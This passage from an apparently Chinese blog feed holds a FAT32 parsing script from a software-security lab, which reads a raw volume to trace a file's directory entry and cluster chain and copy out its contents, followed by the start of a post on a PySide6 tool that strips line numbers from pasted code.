punctuation">.</span>upper<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>dentrys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>idx<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span>file_name_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        continue_flag <span class="token operator">=</span> <span class="token boolean">True</span>                        <span class="token keyword">break</span>                    <span class="token comment">#else:</span>                        <span class="token comment">#print(str.upper(chr(int(dentrys[i][idx[j]], 16))), end="")</span>                        <span class="token keyword">if</span> continue_flag <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                 k <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment">#    binary_dump(dentrys_origin)</span>            <span class="token comment">#    print("good")</span>                <span class="token keyword">break</span>    <span class="token comment">#    print(dentrys)</span>    <span class="token comment">#    print(file_name)</span>    <span class="token comment">#    print(dentrys_origin)</span>    <span class="token comment">#    print(dentrys_origin[dentry_num*0x20:])</span>        <span class="token keyword">return</span> dentrys_origin<span class="token punctuation">[</span>dentry_num<span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token comment"># 通过目录项获取起始簇号</span><span class="token keyword">def</span> <span class="token function">get_clust_idx_and_file_size_by_dentry</span><span class="token punctuation">(</span>dentry<span class="token punctuation">)</span><span class="token punctuation">:</span>    dentry_hex <span class="token operator">=</span>  str_to_hex<span class="token punctuation">(</span>dentry<span class="token punctuation">)</span><span class="token comment">#    print(dentry_hex)</span>    high <span class="token operator">=</span> dentry_hex<span class="token punctuation">[</span><span class="token number">0x14</span><span class="token punctuation">:</span><span class="token number">0x14</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    low <span class="token operator">=</span> dentry_hex<span class="token punctuation">[</span><span class="token number">0x1a</span><span class="token punctuation">:</span><span class="token number">0x1a</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    clust_idx_hex <span class="token operator">=</span> low <span class="token operator">+</span> high<span class="token comment">#    print(high)</span><span class="token comment">#    print(low)</span><span class="token comment">#    print(clust_idx_hex)</span>    clust_idx <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>clust_idx_hex<span class="token punctuation">)</span>    file_size <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>dentry_hex<span class="token punctuation">[</span><span class="token number">0x1c</span><span class="token punctuation">:</span><span class="token number">0x1c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#    print(hex(clust_idx))</span>    <span class="token keyword">return</span> clust_idx<span class="token punctuation">,</span> file_size<span class="token comment"># 通过起始簇号在 FAT 表中找出簇链</span><span class="token keyword">def</span> <span class="token function">get_clust_list_by_fat</span><span class="token punctuation">(</span>clust_idx<span class="token punctuation">,</span> fat_offset<span class="token punctuation">,</span> fat_size<span class="token punctuation">,</span> disk<span class="token punctuation">)</span><span class="token punctuation">:</span>    clust_idx_list<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span>    fat <span class="token operator">=</span> disk<span class="token punctuation">.</span>read<span class="token punctuation">(</span>fat_offset<span class="token operator">+</span>fat_size<span class="token punctuation">)</span><span class="token punctuation">[</span>fat_offset<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>    disk<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#    binary_dump(fat, 0x100)</span>    fat_hex <span class="token operator">=</span> str_to_hex<span class="token punctuation">(</span>fat<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment">#    print(hex(clust_idx))</span>        clust_idx_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>clust_idx<span class="token punctuation">)</span>        clust_idx <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>fat_hex<span class="token punctuation">[</span>clust_idx<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">:</span>clust_idx<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> clust_idx <span class="token operator">==</span> <span class="token number">0xffffff7</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"出现坏簇{0}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>clust_idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> clust_idx <span class="token operator">==</span> <span class="token number">0xfffffff</span> <span class="token keyword">or</span> clust_idx <span class="token operator">==</span> <span class="token number">0xffffff8</span><span class="token punctuation">:</span> <span class="token keyword">break</span>        <span class="token keyword">if</span> clust_idx <span class="token operator">&gt;=</span> <span class="token number">2</span> <span class="token keyword">and</span> clust_idx <span class="token operator">&lt;=</span> <span class="token number">0xfffffef</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> clust_idx_list<span class="token comment"># 找目录项, 其实就是对 find_file_dir_entry 的一个封装, 这里我只是为了方便而已</span><span class="token keyword">def</span> <span class="token function">find_sub_dir_clust_idx_list</span><span class="token punctuation">(</span>dir_name<span class="token punctuation">,</span> parent_clust_idx_list<span class="token punctuation">,</span> root_dir_entry_offset<span class="token punctuation">,</span> root_clust_idx<span class="token punctuation">,</span> sector_per_clust<span class="token punctuation">,</span> byte_per_sector<span class="token punctuation">,</span> disk<span class="token punctuation">,</span> suffix<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">,</span> dentry <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">""</span>    <span class="token keyword">for</span> clust_idx <span class="token keyword">in</span> parent_clust_idx_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span> <span class="token keyword">break</span>        <span class="token triple-quoted-string string">"""        file_clust_offset = root_dir_entry_offset + (clust_idx - root_clust_idx)*sector_per_clust*byte_per_sector#        print("file_clust_offset:", hex(file_clust_offset))        content = disk.read(file_clust_offset+sector_per_clust*byte_per_sector)[file_clust_offset:].decode(encoding='latin-1')        disk.seek(0)        for i in range(0, len(content), 0x20):            dentry = content[i:i+0x20]            if str(dentry[:len(dir_name)]) == str.upper(dir_name):                flag = True                break        """</span>        dir_offset <span class="token operator">=</span> root_dir_entry_offset <span class="token operator">+</span> <span class="token punctuation">(</span>clust_idx <span class="token operator">-</span> root_clust_idx<span class="token punctuation">)</span><span class="token operator">*</span>sector_per_clust<span class="token operator">*</span>byte_per_sector        max_len <span class="token operator">=</span> sector_per_clust<span class="token operator">*</span>byte_per_sector <span class="token operator">//</span> <span class="token number">0x20</span>        dentry<span class="token punctuation">,</span> flag <span class="token operator">=</span> find_file_dir_entry<span class="token punctuation">(</span>dir_name<span class="token punctuation">,</span> dir_offset<span class="token punctuation">,</span> disk<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> max_len<span class="token punctuation">)</span>    <span class="token keyword">return</span> dentry<span class="token comment"># 读取文件内容并写入新文件</span><span class="token keyword">def</span> <span class="token function">read_file_by_clust_list</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> clust_idx_list<span class="token punctuation">,</span> file_size<span class="token punctuation">,</span> root_clust_idx<span class="token punctuation">,</span> root_dir_entry_offset<span class="token punctuation">,</span> sector_per_clust<span class="token punctuation">,</span> byte_per_sector<span class="token punctuation">,</span> disk<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token operator">+</span><span class="token string">"2."</span><span class="token operator">+</span>suffix<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>clust_idx_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            clust_idx <span class="token operator">=</span> clust_idx_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            file_clust_offset <span class="token operator">=</span> root_dir_entry_offset <span class="token operator">+</span> <span class="token punctuation">(</span>clust_idx <span class="token operator">-</span> root_clust_idx<span class="token punctuation">)</span><span class="token operator">*</span>sector_per_clust<span class="token operator">*</span>byte_per_sector            content <span class="token operator">=</span> disk<span class="token punctuation">.</span>read<span class="token punctuation">(</span>file_clust_offset<span class="token operator">+</span>sector_per_clust<span class="token operator">*</span>byte_per_sector<span class="token punctuation">)</span><span class="token punctuation">[</span>file_clust_offset<span class="token punctuation">:</span><span class="token punctuation">]</span>            disk<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>clust_idx_list<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>file_size <span class="token operator">%</span> <span class="token punctuation">(</span>sector_per_clust<span class="token operator">*</span>byte_per_sector<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token punctuation">:</span>file_size<span class="token operator">-</span>sector_per_clust<span class="token operator">*</span>byte_per_sector<span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>clust_idx_list<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\"{0}\" 的文件内容已经存入 \"{1}\"\n"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>suffix<span class="token punctuation">,</span> filename<span class="token operator">+</span><span class="token string">"2."</span><span class="token operator">+</span>suffix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_list_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    file_list_str<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> suffix <span class="token operator">=</span> file_list_str<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> maxsplit<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_list_str<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> maxsplit<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#    print(file_list_str)</span><span class="token comment">#    print(suffix)</span>    disk <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'\\.\\'</span> <span class="token operator">+</span> file_list_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>    byte_per_sector<span class="token punctuation">,</span> sector_per_clust<span class="token punctuation">,</span> saved_sector<span class="token punctuation">,</span> fat_nums<span class="token punctuation">,</span> sector_per_fat<span class="token punctuation">,</span> root_clust_idx <span class="token operator">=</span> read_BPB<span class="token punctuation">(</span>disk<span class="token punctuation">)</span>    root_dir_entry_offset <span class="token operator">=</span> <span class="token punctuation">(</span>saved_sector <span class="token operator">+</span> fat_nums<span class="token operator">*</span>sector_per_fat<span class="token punctuation">)</span> <span class="token operator">*</span> byte_per_sector<span class="token comment">#    print(file_list_str)</span><span class="token comment">#    print("root_dir_entry_offset: ", hex(root_dir_entry_offset))</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>file_list_str<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        dentry<span class="token punctuation">,</span> _ <span class="token operator">=</span>  find_file_dir_entry<span class="token punctuation">(</span>file_list_str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> root_dir_entry_offset<span class="token punctuation">,</span> disk<span class="token punctuation">,</span> suffix<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        dentry<span class="token punctuation">,</span> _ <span class="token operator">=</span>  find_file_dir_entry<span class="token punctuation">(</span>file_list_str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> root_dir_entry_offset<span class="token punctuation">,</span> disk<span class="token punctuation">)</span><span class="token comment">#    binary_dump(dentry)</span>    clust_idx<span class="token punctuation">,</span> file_size <span class="token operator">=</span> get_clust_idx_and_file_size_by_dentry<span class="token punctuation">(</span>dentry<span class="token punctuation">)</span><span class="token comment">#    print("clust_idx: ", hex(clust_idx))</span><span class="token comment">#    print("file_size: ", hex(file_size))</span>    fat_offset <span class="token operator">=</span> saved_sector <span class="token operator">*</span> byte_per_sector    fat_size <span class="token operator">=</span> fat_nums <span class="token operator">*</span> sector_per_fat <span class="token operator">*</span> byte_per_sector<span class="token comment">#    print("fat_offset: ", hex(fat_offset))</span>    clust_idx_list <span class="token operator">=</span> get_clust_list_by_fat<span class="token punctuation">(</span>clust_idx<span class="token punctuation">,</span> fat_offset<span class="token punctuation">,</span> fat_size<span class="token punctuation">,</span> disk<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>file_list_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>file_list_str<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            dentry <span class="token operator">=</span> find_sub_dir_clust_idx_list<span class="token punctuation">(</span>file_list_str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> clust_idx_list<span class="token punctuation">,</span> root_dir_entry_offset<span class="token punctuation">,</span> root_clust_idx<span class="token punctuation">,</span> sector_per_clust<span class="token punctuation">,</span> byte_per_sector<span class="token punctuation">,</span> disk<span class="token punctuation">,</span> suffix<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            dentry <span class="token operator">=</span> find_sub_dir_clust_idx_list<span class="token punctuation">(</span>file_list_str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> clust_idx_list<span class="token punctuation">,</span> root_dir_entry_offset<span class="token punctuation">,</span> root_clust_idx<span class="token punctuation">,</span> sector_per_clust<span class="token punctuation">,</span> byte_per_sector<span class="token punctuation">,</span> disk<span class="token punctuation">)</span>        <span class="token comment">#binary_dump(dentry)</span>        clust_idx<span class="token punctuation">,</span> file_size <span class="token operator">=</span> get_clust_idx_and_file_size_by_dentry<span class="token punctuation">(</span>dentry<span class="token punctuation">)</span>        <span class="token comment">#print("{0} 2".format(hex(clust_idx)))</span>        clust_idx_list <span class="token operator">=</span> get_clust_list_by_fat<span class="token punctuation">(</span>clust_idx<span class="token punctuation">,</span> fat_offset<span class="token punctuation">,</span> fat_size<span class="token punctuation">,</span> disk<span class="token punctuation">)</span>        <span class="token comment">#print("{0} 3".format(i))</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\"{0}\" 的短文件名目录项为: \n"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    binary_dump<span class="token punctuation">(</span>dentry<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     起始簇号为: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>clust_idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     实际文件长度为: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>file_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 输出文件簇链</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\"{0}\" 的簇链为: \n     "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> clust_idx_list<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" ==&gt; "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"0xfffffff(结束标志)"</span><span class="token punctuation">)</span>    read_file_by_clust_list<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> maxsplit<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> clust_idx_list<span class="token punctuation">,</span> file_size<span class="token punctuation">,</span> root_clust_idx<span class="token punctuation">,</span> root_dir_entry_offset<span class="token punctuation">,</span> sector_per_clust<span class="token punctuation">,</span> byte_per_sector<span class="token punctuation">,</span> disk<span class="token punctuation">)</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment">#    filename = input("请输入正确格式的\033[31m绝对文件路径, 其中路径用 \"/\" 进行分割\033[0m, 如 \033[32m\"F:/lab/123/test.txt\"\033[0m : ")</span><span class="token comment">#    filename = "F:/321/123/456/789/zbp_c.txt"</span><span class="token comment">#    filename = "F:/123456789ABCDEFJLMOPQRESUVWXYZ.txt"</span><span class="token comment">#    filename = "F:/PPPP.docx"</span><span class="token comment">#    filename = "F:/GFEDCBA9876543210/132/ABCDEFHJHQDJHHJJHHHHHD/132dsa1d321s32a1dqw5/123456789ABCDEFJLMOPQRESUVWXYZ.txt"</span><span class="token comment">#    filename = "F:/GFEDCBA9876543210/132/xx.txt"    </span>        <span class="token comment"># 将 filename 替换成自己的文件即可</span>    <span class="token comment"># filename = "F:/GFEDCBA9876543210/132/ABCDEFHJHQDJHHJJHHHHHD/132dsa1d321s32a1dqw5/xxx/123456789ABCDEFJLMOPQRESUVWXYZ.docx"</span>    filename <span class="token operator">=</span> <span class="token string">"F:/zbp_c.txt"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请注意, \033[31m文件路径必须是绝对路径, 且用 \"/\" 进行分割\033[0m, 如 \033[32m\"F:/lab/123/test.txt\"\033[0m"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在尝试解析该文件, 请耐心等待......"</span><span class="token punctuation">)</span>        run<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\"{0}\" 文件不存在"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>感谢组长大佬zqb的带领，没有他我肯定是不能独立完成实验全部内容。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyside6实践_1</title>
      <link href="/2023/10/19/pyside6-shi-jian-1/"/>
      <url>/2023/10/19/pyside6-shi-jian-1/</url>
      
        <content type="html"><![CDATA[<p>做实验的时候想拷贝电子参考书代码的时候发现代码都数字序号，手动删除太麻烦了，于是边想着写一个python脚本删除序号，然后不知道怎么突发奇想想试试Python GUI。</p><p>也是第一次接触，故记录一下。</p><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>re<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> <span class="token punctuation">(</span>QLineEdit<span class="token punctuation">,</span> QPushButton<span class="token punctuation">,</span> QApplication<span class="token punctuation">,</span>    QVBoxLayout<span class="token punctuation">,</span> QDialog<span class="token punctuation">,</span>QLabel<span class="token punctuation">,</span>QPlainTextEdit<span class="token punctuation">,</span>QMessageBox<span class="token punctuation">,</span>QGridLayout<span class="token punctuation">)</span><span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtCore <span class="token keyword">import</span> Qt<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtGui <span class="token keyword">import</span> QIcon<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtGui <span class="token keyword">import</span> QKeyEvent<span class="token punctuation">,</span>QTextCursor<span class="token punctuation">,</span>QGuiApplication<span class="token keyword">class</span> <span class="token class-name">CustomPlainTextEdit</span><span class="token punctuation">(</span>QPlainTextEdit<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">keyPressEvent</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">:</span> QKeyEvent<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>Qt<span class="token punctuation">.</span>Key_Return<span class="token punctuation">)</span> <span class="token keyword">or</span> event<span class="token punctuation">.</span>key<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>Qt<span class="token punctuation">.</span>Key_Enter<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>moveCursor<span class="token punctuation">(</span>QTextCursor<span class="token punctuation">.</span>End<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>insertPlainText<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>keyPressEvent<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Form</span><span class="token punctuation">(</span>QDialog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> parent<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Form<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>parent<span class="token punctuation">)</span> <span class="token comment">#parent指定对话框的父窗口</span>        self<span class="token punctuation">.</span>label <span class="token operator">=</span> QLabel<span class="token punctuation">(</span><span class="token string">"请输入文本，将帮您实现去除每行文本开头数字序号和空格："</span><span class="token punctuation">)</span>        <span class="token comment"># 创建组件</span>        self<span class="token punctuation">.</span>edit <span class="token operator">=</span> CustomPlainTextEdit<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>setFixedWidth<span class="token punctuation">(</span><span class="token number">450</span><span class="token punctuation">)</span>  <span class="token comment"># 设置宽度为200像素</span>        self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>setFixedHeight<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>  <span class="token comment"># 设置高度为30像素</span>        <span class="token comment">#self.edit.setAlignment(Qt.AlignTop)  # 将文本对齐方式设置为顶部对齐</span>        self<span class="token punctuation">.</span>lines <span class="token operator">=</span> <span class="token punctuation">[</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>button <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span><span class="token string">"Run"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>button_copy <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span><span class="token string">"一键复制结果"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>button_copy<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>copy_text<span class="token punctuation">)</span>        